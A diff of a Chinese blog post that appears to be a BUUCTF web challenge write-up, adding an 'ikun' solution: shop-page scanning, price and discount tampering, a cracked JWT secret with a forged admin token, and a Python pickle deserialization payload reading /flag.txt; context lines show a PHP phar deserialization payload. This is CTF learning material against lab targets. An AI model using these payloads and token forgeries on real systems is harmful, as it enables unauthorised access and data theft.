@@ -92,7 +92,11 @@
 <meta property="og:image" content="http://i2.tiimg.com/665720/e89221330848e210.png">
 <meta property="og:image" content="http://i1.fuimg.com/665720/cc18d45cc72570ee.png">
 <meta property="og:image" content="http://i1.fuimg.com/665720/83e490ae5dca94a5.png">
-<meta property="og:updated_time" content="2019-07-27T08:08:50.683Z">
+<meta property="og:image" content="http://i1.fuimg.com/665720/12f7681ee9a5d519.png">
+<meta property="og:image" content="http://i1.fuimg.com/665720/f7a4d91dfa43c164.png">
+<meta property="og:image" content="http://i2.tiimg.com/665720/3c7c5093c23d9e17.png">
+<meta property="og:image" content="http://i2.tiimg.com/665720/3beeea18531198e1.png">
+<meta property="og:updated_time" content="2019-07-27T16:24:27.225Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF web writeup">
 <meta name="twitter:description" content="warmup靶机F12发现source.php,打开发现源码,顺着源码又发现了hint.php,得到flag in ffffllllaaaagggg,继续阅读源码。">
@@ -346,8 +350,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-27T16:08:50+08:00">
-                2019-07-27
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-28T00:24:27+08:00">
+                2019-07-28
               </time>
             
           </span>
@@ -408,7 +412,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  4.3k 字
+                  4.7k 字
                 </span>
               
 
@@ -424,7 +428,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  21 分钟
+                  23 分钟
                 </span>
               
             </div>
@@ -510,6 +514,12 @@
 <p>运行<code>php phartest.php</code>,成功输出<code>chenxiyuan</code>.测试发现,<code>$filename= &#39;phar://phar.phar&#39;</code>,虽然会报错但依旧会输出.<br>经过代码审计发现<code>delete.php</code>可以利用.<code>$file-&gt;detele();</code>再看<code>class.php</code>里的file类的delete方法:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
 <p>unlink可以反序列化,而且<code>delete.php</code>文件incldue了<code>class.php</code>,也就可以利用<code>FileList</code>类的<code>__destruct()</code>方法,满足攻击的三个条件:<br>1.phar文件要能够上传到服务器端。<br>2.要有可用的魔术方法作为“跳板”。<br>3.文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。<br>然后分析<code>class.php</code>类的结构关系,构造脚本生成phar文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125; </span><br><span class="line">    class File&#123;</span><br><span class="line">        public $filename;</span><br><span class="line">        public function __construct($name)&#123;</span><br><span class="line">            $this-&gt;filename=$name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;files=array(new File(&apos;/flag.txt&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    $o = new User();</span><br><span class="line">    $o-&gt;db =new FileList();</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>上传生成的<code>phar.phar</code>,然后抓包改<code>Content-Type</code>为<code>image/jpeg</code>.<br><img src="http://i1.fuimg.com/665720/cc18d45cc72570ee.png" alt="Markdown"><br>然后再delete,抓包改filename为<code>phar://phar.jpg</code>.成功读取flag.<br><img src="http://i1.fuimg.com/665720/83e490ae5dca94a5.png" alt="Markdown"></p>
+<h2 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a>ikun</h2><p><a href="http://web44.buuoj.cn/" target="_blank" rel="noopener">靶机</a><br>先注册个账号,登陆.<br>F12,提示这题脑洞很大留了hint,看到ikun们冲鸭,一定要买到lv6!!!,应该是要买lv6的账号,写个脚本找:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">	r =requests.get(url+str(i))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		print(<span class="string">'find it'</span>+str(i))</span><br><span class="line">		exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<p>发现是在180页.<br><img src="http://i1.fuimg.com/665720/12f7681ee9a5d519.png" alt="Markdown"><br>hint:I’m flag man说明找对了,点击buy钱不够肯定买不了的,一直操作失败,F12以后找到post表单,价格改为1,再点buy虽然还是操作失败,但是返回以后发现进入了购物车,变成了折扣选项,可以抓包改discount<code>0.0000000000000000000000000001</code>,然后成功跳转<code>b1g_m4mber</code>这个页面.<br><img src="http://i1.fuimg.com/665720/f7a4d91dfa43c164.png" alt="Markdown"><br>提示只能admin访问,查看cookie里有jwt,以前做过jwt的题,看来是修改jwt了.<br>用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>脚本跑密钥.<br><img src="http://i2.tiimg.com/665720/3c7c5093c23d9e17.png" alt="Markdown"><br>跑出来是<code>1Kun</code>,<a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a>encode一下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure></p>
+<p>修改cookie.<br><img src="http://i2.tiimg.com/665720/3beeea18531198e1.png" alt="Markdown"><br>成功跳转F12,<code>&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</code>,成功得到源码,发现是tornado,前两个星期看了Django和flask,正好看看tornado框架,开始审计吧.<br>发现<code>Admin.py</code>存在反序列化操作,对应的地方就是admin界面点击一键成为大会员的地方:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>直接编写脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">'().__class__.__bases__[0].__subclasses__()[40]("/flag.txt").read()'</span>,))</span><br><span class="line">		<span class="comment">#当然这里也可以不写这么花QAQ,写一个简单的open也是可以的.</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></p>
+<p>运行脚本生成payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%27%28%29.__class__.__bases__%5B0%5D.__subclasses__%28%29%5B40%5D%28%22/flag.txt%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure></p>
+<p>然后直接抓包修改<code>become</code>参数,就可以得到flag了.</p>
 
       
     </div>
@@ -554,7 +564,7 @@
 
     
       <div>
-         <ul class="post-copyright"> <li class="post-copyright-author"> <strong>本文标题:</strong> <a href="/2019/07/21/BUUCTF-web-writeup/">BUUCTF web writeup</a> </li> <li class="post-copyright-author"> <strong>本文作者：</strong>晨曦远 </li> <li class="post-copyright-author"> <strong>发布时间:</strong>2019年07月21日 - 23:07 </li> <li class="post-copyright-author"> <strong>最后更新:</strong>2019年07月27日 - 16:07 </li> <li class="post-copyright-link"> <strong>本文链接：</strong> <a href="http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/" title="BUUCTF web writeup">http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/</a> </li> <li class="post-copyright-license"> <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！ </li> </ul> 
+         <ul class="post-copyright"> <li class="post-copyright-author"> <strong>本文标题:</strong> <a href="/2019/07/21/BUUCTF-web-writeup/">BUUCTF web writeup</a> </li> <li class="post-copyright-author"> <strong>本文作者：</strong>晨曦远 </li> <li class="post-copyright-author"> <strong>发布时间:</strong>2019年07月21日 - 23:07 </li> <li class="post-copyright-author"> <strong>最后更新:</strong>2019年07月28日 - 00:07 </li> <li class="post-copyright-link"> <strong>本文链接：</strong> <a href="http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/" title="BUUCTF web writeup">http://chenxiyuan.vip/2019/07/21/BUUCTF-web-writeup/</a> </li> <li class="post-copyright-license"> <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！ </li> </ul> 
 
 
 
@@ -793,7 +803,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup"><span class="nav-number">1.</span> <span class="nav-text">warmup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#随便注"><span class="nav-number">2.</span> <span class="nav-text">随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#高明的黑客"><span class="nav-number">3.</span> <span class="nav-text">高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-tornado"><span class="nav-number">4.</span> <span class="nav-text">easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">5.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#piapiapia"><span class="nav-number">6.</span> <span class="nav-text">piapiapia</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin"><span class="nav-number">7.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dropbox"><span class="nav-number">8.</span> <span class="nav-text">Dropbox</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup"><span class="nav-number">1.</span> <span class="nav-text">warmup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#随便注"><span class="nav-number">2.</span> <span class="nav-text">随便注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#高明的黑客"><span class="nav-number">3.</span> <span class="nav-text">高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-tornado"><span class="nav-number">4.</span> <span class="nav-text">easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">5.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#piapiapia"><span class="nav-number">6.</span> <span class="nav-text">piapiapia</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin"><span class="nav-number">7.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dropbox"><span class="nav-number">8.</span> <span class="nav-text">Dropbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ikun"><span class="nav-number">9.</span> <span class="nav-text">ikun</span></a></li></ol></div>
             
 
           </div>
@@ -835,7 +845,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">30.5k</span>
+    <span title="Site words total count">30.9k</span>
   
 </div>
 
